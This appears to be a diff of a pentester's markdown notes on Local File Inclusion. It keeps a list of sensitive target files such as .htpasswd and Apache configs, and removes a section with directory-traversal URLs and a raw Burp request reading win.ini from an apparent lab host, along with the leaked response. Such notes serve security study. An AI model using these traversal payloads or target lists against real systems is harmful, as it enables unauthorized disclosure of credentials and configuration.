@@ -1,4 +1,4 @@
-# Testing for LFI
+# LFI
 
 ### LFI Local File Inclusion
 
@@ -263,46 +263,4 @@ CMS Config Files
 /etc/httpd/conf/httpd.conf
 /usr/local/apache2/apache2.conf
 /var/www/html/.htpasswd
-```
-
-### Bypassing Path normalization
-
-* If you make a request in the browser to:&#x20;
-
-```
-https://ip/../../../../../../../../etc/passwd
-```
-
-* And you notice when you make the request the website path goes back to:
-
-```
-https://ip/
-```
-
-* Use Burp Suite repeater to make the request manually&#x20;
-
-```
-GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
-Host: 10.10.10.184
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Connection: close
-Cookie: dataPort=6063
-Upgrade-Insecure-Requests: 1
-
-HTTP/1.1 200 OK
-Content-type: 
-Content-Length: 92
-Connection: close
-AuthInfo: 
-
-; for 16-bit app support
-[fonts]
-[extensions]
-[mci extensions]
-[files]
-[Mail]
-MAPI=1
 ```
